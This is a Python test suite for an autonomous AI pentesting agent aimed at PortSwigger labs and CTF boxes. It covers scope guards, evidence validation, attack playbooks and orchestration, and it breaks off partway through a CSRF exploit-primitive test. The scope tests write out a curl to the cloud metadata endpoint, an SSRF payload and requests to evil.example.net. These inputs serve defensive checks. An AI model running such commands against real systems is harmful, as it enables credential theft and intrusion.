import os
import json
import time
import unittest
from concurrent.futures import ThreadPoolExecutor
from unittest.mock import patch

from hacking_agent.agents.base import BudgetedToolExecutor
from hacking_agent.agents.analyst import AnalystAgent
from hacking_agent.agents.exploitation import ExploitationAgent
from hacking_agent.core.evidence import EvidenceStore
from hacking_agent.cli.lab_eval import DEFAULT_CASES, evaluate_case
from hacking_agent.core.expert_playbooks import EXPERT_PLAYBOOKS, render_playbook_context
from hacking_agent.core.failure import classify_failure
from hacking_agent.core.lab_intel import (
    category_playbooks,
    detect_lab_profile,
    detect_target_category,
    extract_credentials,
    normalize_target_input,
)
from hacking_agent.core.memory import AgentMemory
from hacking_agent.core.paths import LOG_DIR
from hacking_agent.core.providers import (
    ProviderRegistry,
    _apply_openai_compatible_params,
    _provider_display_name,
)
from hacking_agent.core.schemas import AgentResult, AgentTask, PoC, ToolDecision
from hacking_agent.core.schemas import CoordinatorDecision, PivotDecision, ProviderConfig
from hacking_agent.core.scope import ScopeGuard, ScopeViolation
from hacking_agent.core.state_machine import Event, StateMachine
from hacking_agent.core.subagents import (
    BoundedSubagentScheduler,
    SubagentPolicy,
    SubagentSpec,
)
from hacking_agent.core.tool_catalog import render_tool_catalog
from hacking_agent.core.tools import TOOL_FUNCTIONS, TOOL_SCHEMAS, execute_tool


class EvidenceLifecycleTests(unittest.TestCase):
    def test_validator_refutation_overrides_prior_success(self):
        store = EvidenceStore()
        store.record(PoC(
            vuln_id="vuln:1",
            payload="payload",
            request_summary="claimed exploit",
            response_excerpt="looks good",
            verdict="success",
            agent_name="exploitation",
        ))
        self.assertTrue(store.is_verified("vuln:1"))

        store.record(PoC(
            vuln_id="vuln:1",
            payload="payload",
            request_summary="REFUTED: claimed exploit",
            response_excerpt="signal was environmental",
            verdict="failure",
            agent_name="validator",
        ))
        self.assertFalse(store.is_verified("vuln:1"))
        self.assertEqual(store.verification_state("vuln:1"), "refuted")

    def test_validator_confirmation_restores_verified_state(self):
        store = EvidenceStore()
        store.record(PoC(
            vuln_id="vuln:1",
            payload="payload",
            request_summary="REFUTED: original",
            response_excerpt="bad signal",
            verdict="failure",
            agent_name="validator",
        ))
        store.record(PoC(
            vuln_id="vuln:1",
            payload="payload",
            request_summary="VALIDATED: replay",
            response_excerpt="causal signal",
            verdict="success",
            agent_name="validator",
        ))
        self.assertTrue(store.is_verified("vuln:1"))


class ScopeGuardTests(unittest.TestCase):
    def test_http_request_out_of_scope_blocks(self):
        guard = ScopeGuard.from_target_url("https://lab.example.com")
        with self.assertRaises(ScopeViolation):
            guard.validate("http_request", {"url": "https://evil.example.net/"})

    def test_shell_direct_metadata_target_blocks(self):
        guard = ScopeGuard.from_target_url("https://lab.example.com")
        with self.assertRaises(ScopeViolation):
            guard.validate("run_shell", {
                "command": "curl -s http://169.254.169.254/latest/meta-data/"
            })

    def test_shell_ssrf_payload_url_does_not_change_direct_target(self):
        guard = ScopeGuard.from_target_url("https://lab.example.com")
        guard.validate("run_shell", {
            "command": (
                "curl -sk -d 'target=http://169.254.169.254/latest/meta-data/' "
                "https://lab.example.com/register"
            )
        })

    def test_bare_ip_target_scopes_shell_tools(self):
        guard = ScopeGuard.from_target_url("10.10.10.10")
        guard.validate("run_shell", {"command": "nmap -sV 10.10.10.10"})
        with self.assertRaises(ScopeViolation):
            guard.validate("run_shell", {"command": "nmap -sV 10.10.10.11"})

    def test_caido_local_send_is_scope_checked(self):
        guard = ScopeGuard.from_target_url("https://lab.example.com")
        guard.validate("caido_local_api", {
            "operation": "send_raw",
            "args": {
                "raw_request": "GET / HTTP/1.1\r\nHost: lab.example.com\r\n\r\n",
                "hostname": "lab.example.com",
            },
        })
        with self.assertRaises(ScopeViolation):
            guard.validate("caido_local_api", {
                "operation": "send_raw",
                "args": {
                    "raw_request": "GET / HTTP/1.1\r\nHost: evil.example.net\r\n\r\n",
                    "hostname": "evil.example.net",
                },
            })

    def test_request_smuggling_probe_is_scope_checked(self):
        guard = ScopeGuard.from_target_url("https://lab.example.com")
        guard.validate("request_smuggling_probe", {
            "url": "https://lab.example.com/",
        })
        with self.assertRaises(ScopeViolation):
            guard.validate("request_smuggling_probe", {
                "url": "https://evil.example.net/",
            })

    def test_budgeted_executor_blocks_before_tool_execution(self):
        guard = ScopeGuard.from_target_url("https://lab.example.com")
        executor = BudgetedToolExecutor(AgentMemory(), StateMachine(), scope_guard=guard)
        outcome = executor.call(
            ToolDecision(
                tool="http_request",
                args={"url": "https://evil.example.net/"},
                reasoning="test scope gate",
                expected_signal="blocked",
            ),
            agent_name="test",
        )
        self.assertTrue(outcome["blocked"])
        self.assertIn("SCOPE VIOLATION", outcome["blocked_reason"])


class TargetParsingTests(unittest.TestCase):
    def test_prefers_explicit_target_marker_over_internal_url(self):
        target, objective = normalize_target_input(
            "Craft SSRF to access http://169.254.169.254/latest/meta-data/ "
            "Target: https://0abc.web-security-academy.net/"
        )
        self.assertEqual(target, "https://0abc.web-security-academy.net/")
        self.assertIn("169.254.169.254", objective)

    def test_extracts_bare_ctf_box_ip(self):
        target, objective = normalize_target_input(
            "Authorized CTF box: 10.10.10.10. Scope: single host only."
        )
        self.assertEqual(target, "10.10.10.10")
        self.assertIn("single host", objective)

    def test_detects_common_portswigger_profiles(self):
        target = "https://0abc.web-security-academy.net/"
        profile = detect_lab_profile(
            "Blind XXE with out-of-band interaction. Target: " + target,
            target,
        )
        self.assertEqual(profile["id"], "portswigger_blind_xxe_oob")
        self.assertEqual(profile["playbook_id"], "blind_xxe_oob")

        profile = detect_lab_profile(
            "SSRF via OpenID dynamic client registration. Target: " + target,
            target,
        )
        self.assertEqual(profile["id"], "portswigger_oidc_dynamic_client_registration_ssrf")
        self.assertEqual(profile["playbook_id"], "oauth_ssrf_dynamic_registration")

    def test_extracts_lab_credentials_without_confusing_urls(self):
        credentials = extract_credentials(
            "You can log in using wiener:peter. Target: https://0abc.web-security-academy.net/"
        )
        self.assertEqual(credentials, [{"username": "wiener", "password": "peter"}])

    def test_detects_expert_portswigger_topics(self):
        target = "https://0abc.web-security-academy.net/"
        cases = [
            ("SQL injection lab. Target: " + target, "sqli"),
            ("JWT authentication bypass lab. Target: " + target, "jwt"),
            ("HTTP request smuggling CL.TE lab. Target: " + target, "request_smuggling"),
            ("Web cache poisoning with an unkeyed header. Target: " + target, "web_cache_poisoning"),
            ("Web cache deception lab. Target: " + target, "web_cache_deception"),
            ("Server-side template injection lab. Target: " + target, "ssti"),
            ("Prototype pollution lab. Target: " + target, "prototype_pollution"),
            ("GraphQL introspection authz lab. Target: " + target, "graphql_api"),
            ("Race condition limit-overrun lab. Target: " + target, "race_condition"),
            ("Access control IDOR lab. Target: " + target, "access_control_idor"),
            ("Authentication password reset lab. Target: " + target, "authentication"),
            ("OAuth authentication lab. Target: " + target, "oauth"),
            ("HTTP Host header password reset poisoning lab. Target: " + target, "host_header"),
            ("Information disclosure debug page lab. Target: " + target, "information_disclosure"),
            ("Clickjacking lab. Target: " + target, "clickjacking"),
            ("DOM-based vulnerabilities lab. Target: " + target, "dom_based"),
            ("Reflected XSS lab. Target: " + target, "xss"),
            ("DOM XSS lab. Target: " + target, "dom_xss"),
            ("Path traversal lab. Target: " + target, "path_traversal"),
            ("CORS vulnerability lab. Target: " + target, "cors"),
            ("XML external entity XXE injection lab. Target: " + target, "xxe"),
            ("WebSocket security flaw lab. Target: " + target, "websocket"),
            ("Business logic flaw lab. Target: " + target, "business_logic"),
            ("File upload vulnerability lab. Target: " + target, "file_upload"),
            ("Essential skills mystery lab. Target: " + target, "essential_skills"),
            ("NoSQL injection lab. Target: " + target, "nosql_injection"),
            ("API testing OpenAPI lab. Target: " + target, "api_testing"),
            ("Web LLM attacks prompt injection lab. Target: " + target, "web_llm_attacks"),
            ("OS command injection lab. Target: " + target, "os_command_injection"),
            ("Server-side request forgery SSRF lab. Target: " + target, "ssrf"),
        ]
        for objective, playbook_id in cases:
            with self.subTest(playbook_id=playbook_id):
                profile = detect_lab_profile(objective, target)
                self.assertEqual(profile["playbook_id"], playbook_id)
                self.assertIn("expert_playbook", profile)

    def test_playbook_context_contains_strategy_and_validation(self):
        context = render_playbook_context("request smuggling")
        self.assertIn("primary_tools", context)
        self.assertIn("validation", context)
        self.assertIn("raw", context.lower())

    def test_every_portswigger_topic_from_user_request_has_playbook(self):
        expected = {
            "sqli",
            "xss",
            "csrf",
            "clickjacking",
            "dom_based",
            "cors",
            "xxe",
            "ssrf",
            "request_smuggling",
            "os_command_injection",
            "ssti",
            "path_traversal",
            "access_control_idor",
            "authentication",
            "websocket",
            "web_cache_poisoning",
            "deserialization",
            "information_disclosure",
            "business_logic",
            "host_header",
            "oauth",
            "file_upload",
            "jwt",
            "essential_skills",
            "prototype_pollution",
            "graphql_api",
            "race_condition",
            "nosql_injection",
            "api_testing",
            "web_llm_attacks",
            "web_cache_deception",
        }
        missing = expected.difference(EXPERT_PLAYBOOKS)
        self.assertEqual(missing, set())


class FailureClassificationTests(unittest.TestCase):
    def test_classifies_scope_and_auth_failures(self):
        scope = classify_failure("SCOPE VIOLATION: blocked out of scope request", [])
        self.assertEqual(scope["category"], "scope_blocked")

        auth = classify_failure("403 Forbidden - login required", [])
        self.assertEqual(auth["category"], "auth_required")

    def test_classifies_duplicate_loop_from_recent_failures(self):
        failures = [
            {"tool": "http_request", "reason": "no signal", "lesson": "change payload"},
            {"tool": "http_request", "reason": "no signal", "lesson": "change payload"},
            {"tool": "http_request", "reason": "no signal", "lesson": "change payload"},
        ]
        result = classify_failure("Still failed", failures)
        self.assertEqual(result["category"], "duplicate_loop")


class LabEvalTests(unittest.TestCase):
    def test_lab_eval_scores_detected_expert_case(self):
        result = evaluate_case(
            "Prototype pollution lab. Target: https://0abc.web-security-academy.net/"
        )
        self.assertEqual(result["playbook_id"], "prototype_pollution")
        self.assertGreaterEqual(result["readiness_score"], 8)

    def test_default_eval_suite_covers_all_user_requested_topics(self):
        results = [evaluate_case(case) for case in DEFAULT_CASES]
        self.assertEqual(len(results), 32)
        bad = [
            (item["name"], item["playbook_id"], item["gaps"])
            for item in results
            if item["readiness_score"] < 8
        ]
        self.assertEqual(bad, [])


class SubagentSchedulerTests(unittest.TestCase):
    def test_runs_safe_subagents_in_parallel(self):
        scheduler = BoundedSubagentScheduler(SubagentPolicy(max_parallel=2))

        def sleeper(name: str):
            def run():
                time.sleep(0.2)
                return AgentResult(success=True, summary=f"{name} done")
            return run

        started = time.monotonic()
        runs = scheduler.run([
            SubagentSpec(name="a", lane="readiness", run=sleeper("a")),
            SubagentSpec(name="b", lane="analysis", run=sleeper("b")),
        ])
        elapsed = time.monotonic() - started

        self.assertEqual(len(runs), 2)
        self.assertTrue(all(run.success for run in runs))
        self.assertTrue(all(run.parallel for run in runs))
        self.assertLess(elapsed, 0.35)

    def test_state_mutating_subagents_are_serial_by_default(self):
        scheduler = BoundedSubagentScheduler(SubagentPolicy(max_parallel=2))
        order: list[str] = []

        def mutating(name: str):
            def run():
                order.append(name)
                return AgentResult(success=True, summary=f"{name} done")
            return run

        runs = scheduler.run([
            SubagentSpec(
                name="exploit-a",
                lane="exploitation",
                run=mutating("a"),
                mutates_target=True,
            ),
            SubagentSpec(
                name="exploit-b",
                lane="exploitation",
                run=mutating("b"),
                mutates_target=True,
            ),
        ])

        self.assertEqual(order, ["a", "b"])
        self.assertTrue(all(not run.parallel for run in runs))

    def test_race_condition_can_opt_into_parallel_stateful_lanes(self):
        scheduler = BoundedSubagentScheduler(SubagentPolicy(
            max_parallel=2,
            allow_stateful_parallel=True,
        ))
        runs = scheduler.run([
            SubagentSpec(
                name="race-a",
                lane="exploitation",
                run=lambda: AgentResult(success=True, summary="a"),
                mutates_target=True,
            ),
            SubagentSpec(
                name="race-b",
                lane="exploitation",
                run=lambda: AgentResult(success=True, summary="b"),
                mutates_target=True,
            ),
        ], lab_profile={"playbook_id": "race_condition"})

        self.assertTrue(all(run.parallel for run in runs))


class StateMachineConcurrencyTests(unittest.TestCase):
    def test_tool_call_recording_is_thread_safe(self):
        sm = StateMachine()

        def record_many():
            for _ in range(100):
                sm.record_tool_call("http_request")

        with ThreadPoolExecutor(max_workers=8) as pool:
            list(pool.map(lambda _: record_many(), range(8)))

        self.assertEqual(sm.tool_calls["http_request"], 800)

    def test_tool_budget_reservation_is_atomic(self):
        sm = StateMachine()

        with ThreadPoolExecutor(max_workers=20) as pool:
            results = list(pool.map(lambda _: sm.try_record_tool_call("nuclei_scan"), range(50)))

        self.assertEqual(sum(1 for item in results if item), 5)
        self.assertEqual(sm.tool_calls["nuclei_scan"], 5)


class AnalystProfileFallbackTests(unittest.TestCase):
    def test_profile_driven_analyst_creates_focused_finding(self):
        memory = AgentMemory(target_url="https://0abc.web-security-academy.net/")
        memory.add_entity("Target", {"url": "https://0abc.web-security-academy.net/"})
        profile = detect_lab_profile(
            "HTTP request smuggling CL.TE lab. Target: https://0abc.web-security-academy.net/",
            "https://0abc.web-security-academy.net/",
        )
        analyst = AnalystAgent(
            provider=None,
            memory=memory,
            state_machine=StateMachine(),
            evidence=EvidenceStore(),
        )
        output = analyst.execute(
            AgentTask(
                task_description="Analyze detected lab profile.",
                context={
                    "target_url": "https://0abc.web-security-academy.net/",
                    "lab_profile": profile,
                },
            )
        )
        self.assertTrue(output.success)
        self.assertEqual(len(output.vulnerabilities_found), 1)
        self.assertIn("request smuggling", output.vulnerabilities_found[0].vuln_type.lower())


class ExploitationFastPathTests(unittest.TestCase):
    def test_request_smuggling_fast_path_uses_raw_probe_without_llm(self):
        class FakeExecutor:
            def __init__(self):
                self.calls = []

            def call(self, decision, agent_name, phase="general", iteration=0):
                self.calls.append(decision)
                return {
                    "blocked": False,
                    "blocked_reason": "",
                    "signals": None,
                    "result": json.dumps({
                        "success": True,
                        "likely_vulnerability": "cl_te",
                        "evidence_summary": "CL.TE differential response observed.",
                        "baseline": {"statuses": [200, 200], "timed_out": False},
                        "probes": {
                            "cl_te_404": {
                                "statuses": [200, 404],
                                "timed_out": False,
                                "raw_excerpt": "HTTP/1.1 404 Not Found",
                            },
                        },
                    }),
                }

        memory = AgentMemory(target_url="https://0abc.web-security-academy.net/")
        target = memory.add_entity("Target", {"url": memory.target_url})
        vuln = memory.add_entity("Vulnerability", {
            "vuln_type": "HTTP request smuggling / desync",
            "severity": "high",
            "target_entity_id": target.id,
            "hypothesis": "CL.TE request smuggling differential 404 lab.",
            "status": "theoretical",
        }, entity_id="vulnerability:1")
        evidence = EvidenceStore()
        fake = FakeExecutor()
        profile = detect_lab_profile(
            "HTTP request smuggling, confirming a CL.TE vulnerability via differential responses. "
            "Target: https://0abc.web-security-academy.net/",
            memory.target_url,
        )
        agent = ExploitationAgent(
            provider=None,
            memory=memory,
            state_machine=StateMachine(),
            evidence=evidence,
            tool_executor=fake,
        )

        result = agent.execute(AgentTask(
            task_description="Exploit CL.TE request smuggling and trigger 404.",
            context={"target_url": memory.target_url, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))

        self.assertTrue(result.success)
        self.assertEqual(fake.calls[0].tool, "request_smuggling_probe")
        self.assertEqual(fake.calls[0].args["vector"], "cl_te_404")
        self.assertTrue(evidence.is_verified(vuln.id))
        self.assertEqual(vuln.attrs["status"], "verified")


class ToolRegressionTests(unittest.TestCase):
    def test_gpt55_uses_max_completion_tokens_for_chat_completions(self):
        cfg = ProviderConfig(
            model="gpt-5.5",
            api_key="test",
            base_url="https://api.openai.com/v1",
        )
        kwargs = {"model": cfg.model, "messages": []}
        _apply_openai_compatible_params(kwargs, cfg)

        self.assertEqual(kwargs["max_completion_tokens"], cfg.max_tokens)
        self.assertNotIn("max_tokens", kwargs)
        self.assertNotIn("temperature", kwargs)

    def test_deepseek_keeps_legacy_max_tokens_param(self):
        cfg = ProviderConfig(
            model="deepseek-v4-pro",
            api_key="test",
            base_url="https://api.deepseek.com",
        )
        kwargs = {"model": cfg.model, "messages": []}
        _apply_openai_compatible_params(kwargs, cfg)

        self.assertEqual(kwargs["max_tokens"], cfg.max_tokens)
        self.assertEqual(kwargs["temperature"], cfg.temperature)
        self.assertNotIn("max_completion_tokens", kwargs)

    def test_openai_provider_display_name_is_not_generic_compatible(self):
        cfg = ProviderConfig(
            model="gpt-5.5",
            api_key="test",
            base_url="https://api.openai.com/v1",
        )

        self.assertEqual(_provider_display_name(cfg), "openai")

    def test_default_reasoning_effort_applies_to_roles_without_role_override(self):
        with patch.dict(os.environ, {
            "LLM_DEFAULT_PROVIDER": "openai",
            "LLM_DEFAULT_MODEL": "gpt-5.5",
            "LLM_DEFAULT_API_KEY": "test",
            "LLM_DEFAULT_BASE_URL": "https://api.openai.com/v1",
            "LLM_DEFAULT_REASONING_EFFORT": "high",
        }, clear=True):
            registry = ProviderRegistry.from_env()

        described = registry.describe()
        self.assertIn("coordinator    -> openai", described)
        self.assertIn("recon          -> openai", described)
        self.assertIn("[effort=high]", described)

    def test_tool_registry_and_schema_count_match_after_caido_local(self):
        self.assertEqual(len(TOOL_FUNCTIONS), len(TOOL_SCHEMAS))
        self.assertIn("caido_local_api", TOOL_FUNCTIONS)
        self.assertIn("request_smuggling_probe", TOOL_FUNCTIONS)

    def test_tool_catalog_prefers_caido_local_over_burp_for_replay(self):
        catalog = render_tool_catalog("general")
        self.assertIn("Caido Local Bridge", catalog)
        self.assertIn("Prefer Caido Local Bridge over Burp MCP", catalog)

    def test_caido_local_unknown_operation_is_stable_json(self):
        raw = execute_tool("caido_local_api", {
            "operation": "unknown",
            "args": {},
        })
        self.assertIn("Unknown Caido local operation", raw)

    def test_analyze_response_tool_imports_package_analyzer(self):
        raw = execute_tool("analyze_response", {
            "response_body": "HTTP/1.1 200 OK\n\nhello <b>probe</b>",
            "payload": "probe",
        })
        self.assertNotIn("No module named 'analyzer'", raw)
        self.assertIn("signals", raw)

    def test_report_log_dir_is_project_log_dir(self):
        from hacking_agent.agents.reporter import ReporterAgent

        reporter = object.__new__(ReporterAgent)
        path = reporter._save_report("test report")
        try:
            self.assertTrue(os.path.abspath(path).startswith(os.path.abspath(str(LOG_DIR))))
        finally:
            if os.path.exists(path):
                os.remove(path)


# =============================================================================
# WS2/WS5 finalization: category -> agenda seeding + offline integration drive
# =============================================================================

def _build_offline_orchestrator(target, objective="", lab_profile=None,
                                max_iterations=12):
    """Construct an Orchestrator fully offline (dummy key, no durable DB, no
    subagents, lexical RAG). Never makes a network call."""
    from hacking_agent.cli.orchestrator import Orchestrator

    env = {
        "DEEPSEEK_API_KEY": "test-key",
        "REYNARD_DURABLE_MEMORY": "0",
        "REYNARD_EMBEDDINGS": "lexical",
    }
    with patch.dict(os.environ, env, clear=False):
        return Orchestrator(
            target_url=target,
            objective=objective,
            lab_profile=lab_profile,
            subagents_enabled=False,
            max_iterations=max_iterations,
        )


class _FakeProvider:
    """Offline stand-in for an LLMProvider (pivot/self-critique role)."""

    def call_typed(self, system, user, schema, max_retries=0):
        return schema(diagnosis="surface exhausted", give_up=True)

    def call_text(self, system, user, max_retries=0):
        return ""


class _ScriptedCoordinator:
    """Always routes to exploitation so the specialist outcome script drives
    the agenda mechanics deterministically."""

    def decide(self, **kwargs):
        return CoordinatorDecision(
            done=False,
            next_agent="exploitation",
            task=AgentTask(task_description="pursue active hypothesis", context={}),
            reasoning="scripted route",
        )


class _ScriptedSpecialist:
    """Returns queued success/failure outcomes, then defaults to success."""

    def __init__(self, outcomes):
        self._outcomes = list(outcomes)
        self.calls = 0

    def execute(self, task):
        self.calls += 1
        ok = self._outcomes.pop(0) if self._outcomes else True
        return AgentResult(success=ok, summary="signal" if ok else "no signal")


class CategoryAgendaSeedingTests(unittest.TestCase):
    def test_category_playbooks_cover_non_web_categories(self):
        self.assertEqual(
            set(category_playbooks("network")), {"network_pentest", "metasploit"}
        )
        self.assertEqual(
            set(category_playbooks("binary")),
            {"binary_pwn", "reverse_engineering"},
        )
        self.assertEqual(category_playbooks("web"), ["essential_skills"])

    def test_network_ip_target_seeds_category_agenda(self):
        orch = _build_offline_orchestrator(
            "10.10.10.10", "Enumerate services on the authorized box."
        )
        try:
            self.assertEqual(orch.target_category, "network")
            orch._seed_hypotheses()
            agenda = orch.agenda.all()
            self.assertTrue(agenda, "non-web target produced an empty agenda")
            seeded = {h.vector for h in agenda
                      if h.notes == "seed:category_playbook"}
            self.assertTrue({"network_pentest", "metasploit"} <= seeded)
            for h in agenda:
                if h.notes == "seed:category_playbook":
                    self.assertEqual(h.vuln_type, "network")
        finally:
            orch.logger.close()

    def test_binary_bin_target_seeds_pwn_playbooks(self):
        self.assertEqual(detect_target_category("challenge.bin", "ELF pwn"), "binary")
        orch = _build_offline_orchestrator(
            "challenge.bin", "Reverse engineer this ELF binary and pop a shell."
        )
        try:
            self.assertEqual(orch.target_category, "binary")
            orch._seed_hypotheses()
            seeded = {h.vector for h in orch.agenda.all()
                      if h.notes == "seed:category_playbook"}
            self.assertTrue({"binary_pwn", "reverse_engineering"} <= seeded)
        finally:
            orch.logger.close()

    def test_web_target_seeding_stays_backward_compatible(self):
        target = "https://0abc.web-security-academy.net/"
        profile = detect_lab_profile("Reflected XSS lab. Target: " + target, target)
        orch = _build_offline_orchestrator(target, "Reflected XSS lab.",
                                           lab_profile=profile)
        try:
            self.assertEqual(orch.target_category, "web")
            orch._seed_hypotheses()
            notes = {h.notes for h in orch.agenda.all()}
            self.assertNotIn("seed:category_playbook", notes)
            self.assertTrue(any(h.vuln_type == "xss" for h in orch.agenda.all()))
        finally:
            orch.logger.close()


class OrchestratorDryRunTests(unittest.TestCase):
    def test_offline_integration_drive(self):
        target = "https://0abc.web-security-academy.net/"
        profile = detect_lab_profile("Reflected XSS lab. Target: " + target, target)
        orch = _build_offline_orchestrator(target, "Reflected XSS lab.",
                                           lab_profile=profile, max_iterations=12)
        try:
            with patch("hacking_agent.cli.orchestrator.load_methodology",
                       return_value=""), \
                    patch("hacking_agent.cli.orchestrator.console"):
                orch.sm.transition(Event.START, "test")
                orch._seed_hypotheses()

                # (1) hypotheses get seeded from the lab profile.
                self.assertTrue(orch.agenda.all())
                primary = next(h for h in orch.agenda.all()
                               if h.notes == "seed:lab_profile")
                self.assertEqual(primary.phase, "recon")

                # A cooler alternative so demotion can backtrack to it.
                alt = orch.agenda.add(
                    text="Alternative vector", vuln_type="sqli", vector="category",
                    phase="recon", heat=0.4, notes="test:alt",
                )

                orch.coordinator = _ScriptedCoordinator()
                spec = _ScriptedSpecialist([True, False, False, False])
                orch.specialists = {k: spec for k in orch.specialists}
                orch.registry.get = lambda role: _FakeProvider()

                # (2)+(3) coordinator step selects the hottest OPEN hypothesis
                # and a success advances its StrategyEngine phase.
                orch._step()
                self.assertIs(orch.active_hypothesis, primary)
                self.assertEqual(primary.phase, "injection")

                # (4) repeated failure demotes the vector and backtracks.
                for _ in range(3):
                    orch._step()
                self.assertEqual(primary.status, "demoted")
                self.assertIs(orch._select_active_hypothesis(), alt)

                # (5) report gating prevents premature done while alt untried.
                gated = orch._intercept_done(
                    CoordinatorDecision(done=True, reasoning="premature")
                )
                self.assertFalse(gated.done)
                self.assertIsNotNone(gated.next_agent)
        finally:
            orch.logger.close()


# =============================================================================
# imp-loop: StallDetector (no-progress / loop detection)
# =============================================================================

class StallDetectorTests(unittest.TestCase):
    def test_stall_fires_after_patience_no_progress_steps(self):
        from hacking_agent.core.strategy import StallDetector

        det = StallDetector(patience=3)
        # First observation never stalls (nothing to compare against).
        self.assertFalse(det.record(
            agent="recon", phase="recon", hypothesis_id="h1",
            kg_count=0, evidence_count=0,
        ))
        # Three consecutive no-progress steps -> stall on the third.
        self.assertFalse(det.record(
            agent="recon", phase="recon", hypothesis_id="h1",
            kg_count=0, evidence_count=0,
        ))
        self.assertFalse(det.record(
            agent="recon", phase="recon", hypothesis_id="h1",
            kg_count=0, evidence_count=0,
        ))
        self.assertTrue(det.record(
            agent="recon", phase="recon", hypothesis_id="h1",
            kg_count=0, evidence_count=0,
        ))

    def test_progress_resets_stall_counter(self):
        from hacking_agent.core.strategy import StallDetector

        det = StallDetector(patience=2)
        det.record(agent="recon", phase="recon", hypothesis_id="h1",
                   kg_count=0, evidence_count=0)
        det.record(agent="recon", phase="recon", hypothesis_id="h1",
                   kg_count=0, evidence_count=0)
        # New KG entity = progress, resets the counter.
        self.assertFalse(det.record(
            agent="recon", phase="recon", hypothesis_id="h1",
            kg_count=5, evidence_count=0,
        ))
        self.assertEqual(det.stall_count, 0)
        # A later phase also counts as progress.
        self.assertFalse(det.record(
            agent="exploitation", phase="injection", hypothesis_id="h1",
            kg_count=5, evidence_count=0,
        ))

    def test_orchestrator_stall_forces_backtrack_and_pivot(self):
        from hacking_agent.core.strategy import StallDetector

        target = "https://0abc.web-security-academy.net/"
        profile = detect_lab_profile("Reflected XSS lab. Target: " + target, target)
        orch = _build_offline_orchestrator(target, "Reflected XSS lab.",
                                           lab_profile=profile)
        try:
            with patch("hacking_agent.cli.orchestrator.console"):
                orch._seed_hypotheses()
                h = orch._select_active_hypothesis()
                self.assertIsNotNone(h)
                orch.stall_detector = StallDetector(patience=1)
                # First step registers a baseline (no stall yet).
                orch._check_stall("recon")
                self.assertFalse(orch._needs_pivot)
                # Second step with no new KG/evidence/phase -> stall -> backtrack.
                orch._check_stall("recon")
                self.assertTrue(orch._needs_pivot)
                self.assertEqual(h.status, "demoted")
                self.assertGreaterEqual(orch._stall_forced_pivots, 1)
        finally:
            orch.logger.close()


# =============================================================================
# imp-loop: redundant-recon guard
# =============================================================================

class ReconGuardTests(unittest.TestCase):
    def test_redundant_recon_advances_phase_and_reroutes(self):
        target = "https://0abc.web-security-academy.net/"
        profile = detect_lab_profile("Reflected XSS lab. Target: " + target, target)
        orch = _build_offline_orchestrator(target, "Reflected XSS lab.",
                                           lab_profile=profile)
        try:
            with patch("hacking_agent.cli.orchestrator.console"):
                orch._seed_hypotheses()
                h = orch._select_active_hypothesis()
                self.assertEqual(h.phase, "recon")
                # Materialize the recon surface for this vector.
                orch.memory.add_entity("Endpoint", {"url": target + "search"})
                orch._recon_materialized.add(orch._recon_signature(h))

                task = AgentTask(task_description="Re-run recon on target.",
                                 context={})
                self.assertTrue(orch._recon_is_redundant(task))
                routed, new_task = orch._advance_past_recon(task)
                self.assertNotEqual(routed, "recon")
                self.assertNotEqual(h.phase, "recon")
                self.assertIn("recon-guard", new_task.task_description)
        finally:
            orch.logger.close()

    def test_recon_not_redundant_without_materialized_surface(self):
        target = "https://0abc.web-security-academy.net/"
        profile = detect_lab_profile("Reflected XSS lab. Target: " + target, target)
        orch = _build_offline_orchestrator(target, "Reflected XSS lab.",
                                           lab_profile=profile)
        try:
            with patch("hacking_agent.cli.orchestrator.console"):
                orch._seed_hypotheses()
                orch._select_active_hypothesis()
                task = AgentTask(task_description="Initial recon.", context={})
                self.assertFalse(orch._recon_is_redundant(task))
        finally:
            orch.logger.close()


# =============================================================================
# imp-schema: JSON pre-extraction + coercion + safe fallback
# =============================================================================

class JsonExtractionTests(unittest.TestCase):
    def test_extract_strips_json_fence(self):
        from hacking_agent.core.providers import _extract_json_object

        raw = "```json\n{\"a\": 1, \"b\": \"x\"}\n```"
        self.assertEqual(_extract_json_object(raw), '{"a": 1, "b": "x"}')

    def test_extract_drops_leading_and_trailing_prose(self):
        from hacking_agent.core.providers import _extract_json_object

        raw = 'Sure! Here is the JSON:\n{"k": "v"}\nHope that helps.'
        self.assertEqual(_extract_json_object(raw), '{"k": "v"}')

    def test_extract_is_brace_balanced_and_string_aware(self):
        from hacking_agent.core.providers import _extract_json_object

        raw = 'noise {"outer": {"inner": "}"}} trailing'
        extracted = _extract_json_object(raw)
        self.assertEqual(json.loads(extracted), {"outer": {"inner": "}"}})

    def test_extract_handles_think_block(self):
        from hacking_agent.core.providers import _extract_json_object

        raw = "<think>let me reason</think>\n{\"give_up\": false}"
        self.assertEqual(json.loads(_extract_json_object(raw)), {"give_up": False})

    def test_coerce_unwraps_single_item_list(self):
        from hacking_agent.core.providers import _coerce_to_schema

        data = _coerce_to_schema([{"diagnosis": "stuck"}], PivotDecision)
        self.assertIsInstance(data, dict)
        self.assertEqual(data["diagnosis"], "stuck")
        self.assertTrue(PivotDecision.model_validate(data))

    def test_fenced_prose_and_list_all_parse_into_pivot_decision(self):
        from hacking_agent.core.providers import (
            _coerce_to_schema, _extract_json_object,
        )

        cases = [
            '```json\n{"diagnosis":"a","give_up":true}\n```',
            'Here you go: {"diagnosis":"b","give_up":false} end',
            '[{"diagnosis":"c"}]',
        ]
        for raw in cases:
            with self.subTest(raw=raw):
                data = json.loads(_extract_json_object(raw))
                data = _coerce_to_schema(data, PivotDecision)
                self.assertTrue(PivotDecision.model_validate(data))

    def test_safe_fallback_only_for_all_optional_schema(self):
        from hacking_agent.core.providers import _safe_fallback
        from hacking_agent.core.schemas import AnalystOutput

        fallback = _safe_fallback(PivotDecision)
        self.assertIsInstance(fallback, PivotDecision)
        self.assertFalse(fallback.give_up)
        # A schema with security-relevant required fields must NOT fabricate one.
        self.assertIsNone(_safe_fallback(AnalystOutput))

    def test_repair_prompt_includes_error_and_example(self):
        from hacking_agent.core.providers import _repair_prompt

        try:
            PivotDecision.model_validate({"give_up": "not-a-bool"})
        except Exception as err:
            prompt = _repair_prompt(PivotDecision, err)
        self.assertIn("failed schema validation", prompt.lower())
        self.assertIn("give_up", prompt)


# =============================================================================
# imp-primitives: deterministic exploit-primitives builders
# =============================================================================

class ExploitPrimitivesTests(unittest.TestCase):
    def test_double_submit_sets_cookie_before_submit_via_onload(self):
        from hacking_agent.core import exploit_primitives as p

        page = p.csrf_double_submit(
            "https://lab/my-account/change-email",
            email_field="email",
            csrf_field="csrf",
            token="FORGED",
            cookie_setter_url="https://lab/?search=inject",
            email_value="attacker@evil.net",
        )
        body = page.body
